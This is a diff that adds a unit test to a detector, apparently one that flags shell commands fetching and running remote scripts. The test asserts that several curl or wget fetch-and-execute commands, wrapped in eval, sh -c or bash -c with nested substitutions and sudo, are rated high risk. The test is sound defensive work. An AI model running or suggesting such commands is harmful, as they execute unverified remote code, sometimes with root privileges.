@@ -65,6 +65,18 @@ class RemoteScriptRun(unittest.TestCase):
                 "source <(curl -s https://x.test/env)"):
             self.assertEqual(hits(command, self.RULE), watch.HIGH, command)
 
+    def test_a_substitution_inside_the_fetch_words_does_not_hide_it(self):
+        # Inside an opener the fetch words are read without crossing another
+        # ( or backquote, which keeps nested openers linear; a path that
+        # holds one is still read from that one's own opener, and a value
+        # may hold flat ones.
+        for command in (
+                'eval "$($(pwd)/curl -s https://x.test/env)"',
+                'eval "$(X=$(id -u) curl -s https://x.test/env)"',
+                'sh -c "$(A=1 B=$(date) /usr/bin/curl -s https://x.test/i.sh)"',
+                'bash -c "$(sudo -E /usr/bin/wget -qO- https://x.test/i.sh)"'):
+            self.assertEqual(hits(command, self.RULE), watch.HIGH, command)
+
     def test_programs_that_hand_their_input_on_do_not_hide_a_substitution(self):
         for command in (
                 "sudo -u root bash <(curl -s https://x.test/i.sh)",
